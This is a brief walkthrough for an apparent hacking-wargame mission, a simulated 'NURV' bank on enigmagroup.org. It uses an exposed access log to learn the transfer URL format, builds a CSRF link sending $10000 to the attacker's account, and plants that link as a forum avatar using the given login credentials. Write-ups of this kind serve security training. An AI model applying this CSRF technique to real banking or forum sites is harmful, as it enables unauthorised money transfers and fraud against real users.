on the bank page check out robots.txt
there is an access_log directory
go to it and look at access_log file
this will tell you how to construct your CSRF
do a search in it for lookuprightnowyoumayfindwhatyourelookingfor

example found
/authed/index.php?page=transfer&amount=$200&recipient=89032189&comment=good%20luck

so we want /authed/index.php?page=transfer&amount=$10000&recipient=13370539&comment=owned in our CSRF
full thing:
http://www.enigmagroup.org/missions/realistics/nurv/bank/authed/index.php?page=transfer&amount=$10000&recipient=13370539&comment=owned

then log in to the forum page ("community") on the actual NURV website as JohnSmith:JohnSmith
go to edit profile
in the avatar put that CSRF

you win!
